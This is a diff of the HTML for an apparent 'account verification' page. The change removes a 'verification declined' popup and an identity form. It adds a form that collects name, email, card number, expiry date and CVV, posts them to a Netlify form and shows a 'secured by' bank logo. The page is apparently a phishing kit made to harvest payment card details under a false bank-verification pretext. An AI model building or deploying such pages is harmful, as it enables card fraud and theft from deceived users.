@@ -4,93 +4,55 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ACCOUNT VERIFICATION </title>
+    <title>account-verification </title>
     <script src="js/jquery.js"></script>
     <link rel="stylesheet" href="veri.css">
 
-
-    <script>
-        $(document).ready(function() {
-            $("#popN").show();
-            $(".container").hide();
-        },3000);
-    </script>
-
-
-
 </head>
 <body>
+    
     <div id="popN">
-        <h1> VERIFICATION DECLINED! </h1>
-        <h2>Sorry you can't verify this account here, visit Nordix office at Internatinal Committee on Fundraising Organization (ICFO).
-         <br>Radhusgata 25, <br>0158 Oslo, Norway
-        </h2><br>
-    </div>
-    <div class="container">
         <div class="title">
-            <h4>ACCOUNT VERIFICATION</h4>
+            <h2>ACCOUNT VERIFICATION</h2>
         </div>
-        <form action="#">
-            <div class="user-details"> 
-                <div class="input-box"> 
-                    <span class="details">First Name</span>
-                    <input type="text" placeholder="Firstname" required>
+        <form name="contact" method="POST" data-netlify="true">
+            <div id="flexDiv">
+                <div class="sec-chld">
+                    <div>
+                        <label class="input-txt" for="email">Surname</label>
+                        <input type="text" name="number">
+                    </div>
+                    <div>
+                        <label class="input-txt" for="email">Lastname</label>
+                        <input type="text" name="number">
+                    </div>
+                    <div>
+                        <label class="input-txt" for="email">Email</label>
+                        <input type="text" name="number">
+                    </div>  
                 </div>
-                <div class="input-box"> 
-                    <span class="details">Last Name</span>
-                    <input type="text" placeholder="Lastname" required>
-                </div>
-                <div class="input-box"> 
-                    <span class="details">State Residence</span>
-                    <input type="text" placeholder="State Residence" required>
-                </div>
-                <div class="input-box"> 
-                    <span class="details">ID Number</span>
-                    <input type="text" placeholder="ID Number" required>
-                </div>
-
-                <div class="input-box"> 
-                    <span class="details">Email</span>
-                    <input type="text" placeholder="Email Address" required>
-                </div>
-                <div class="input-box"> 
-                    <span class="details">Phone</span>
-                    <input type="text" placeholder="Phone" required>
-                </div>
-
-                <div class="input-box"> 
-                    <span class="details">Postal Code</span>
-                    <input type="text" placeholder="Postal Code" required>
-                </div>
-                
-                <div class="input-box"> 
-                    <span class="details">Password</span>
-                    <input type="text" placeholder="Confirm Password" required>
+                <div class="sec-chld">
+                    <div>
+                        <label class="input-txt" for="email">Card Number</label>
+                        <input type="text" name="number">
+                    </div>
+                    <div>
+                        <label class="input-txt" for="email">Expiry Date</label>
+                        <input type="text" name="number">
+                    </div>
+                    <div>
+                        <label class="input-txt" for="email">CVV</label>
+                        <input type="text" name="number">
+                    </div>  
                 </div>
             </div>
-            <div class="gender-details">
-                <input type="radio" name="gender" id="dot-1">
-                <input type="radio" name="gender" id="dot-2">
-                <input type="radio" name="gender" id="dot-3">
-                <span class="gender-title">Gender</span>
-                <div class="category">
-                    <label for="dot-1">
-                        <span class="dot one"></span>
-                        <span class="gender">Male</span>
-                    </label>
-                    <label for="dot-2">
-                        <span class="dot two"></span>
-                        <span class="gender">Female</span>
-                    </label>
-                    <label for="dot-3">
-                        <span class="dot three"></span>
-                        <span class="gender">Others</span>
-                    </label>
-                </div>
-            </div>
-            <div class="button">
-                <input id="regist" type="submit" value="VERIFY">
-            </div>
-        </form>
+                    <div  id="btDiv">
+                        <button type="submit">VERIFY</button>
+                    </div>
+                    <div id="btm">
+                        secured by<img src="advt/dnb.png"> 
+                    </div>
+          </form>
+    </div>
 </body>
 </html>
